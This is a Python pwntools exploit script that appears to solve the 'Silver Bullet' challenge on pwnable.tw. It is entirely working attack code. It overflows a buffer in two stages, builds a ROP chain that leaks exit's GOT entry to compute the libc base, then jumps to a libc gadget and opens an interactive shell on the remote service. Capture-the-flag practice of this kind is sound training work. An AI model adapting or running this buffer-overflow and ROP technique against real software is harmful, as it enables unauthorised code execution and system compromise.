from pwn import *
#s =remote('192.168.50.4',1234)
s = remote('chall.pwnable.tw',10103)
raw_input()
#STAGE 1
s.recvuntil('choice :')
s.send('1\n')
s.recvuntil(' bullet :')
s.send('A'*46)
s.recvuntil('choice :')
s.send('2\n')
s.recvuntil(' bullet :')
s.send('AA')
s.recvuntil('choice :')
s.send('2\n')
s.recvuntil(' bullet :')
stage1 = p32(0x08048498) # printf
stage1 += p32(0x08048475) # pop ebx ; ret
stage1 += p32(0x0804AFE4) # exit_got
stage1 += p32(0x8048954) # To STAGE 2
s.send("\xff"*3+p32(0x0804B028)+stage1)
s.recvuntil('choice :')
s.send('3\n')
s.recvuntil('Oh ! You win !!')
#print util.fiddling.hexdump(s.recvuntil('+'))
exit_got = u32(s.recvuntil('+')[1:5])
libc_base = exit_got - 0x002E7B0
log.info("exit_got : %x"%exit_got)
log.info("libc_base : %x"%libc_base)
#STAGE 2
s.recvuntil('choice :')
s.send('1\n')
s.recvuntil(' bullet :')
s.send('A'*46)
s.recvuntil('choice :')
s.send('2\n')
s.recvuntil(' bullet :')
s.send('AA')
s.recvuntil('choice :')
s.send('2\n')
s.recvuntil(' bullet :')
stage2 = p32(libc_base+0x003A819)
stage2 += p32(0x41414141)
stage2 += p32(0x41414141)
s.send("\xff"*3+p32(0x0804B028)+stage2)
s.recvuntil('choice :')
s.send('3\n')
s.recvuntil('Oh ! You win !!')
s.interactive()
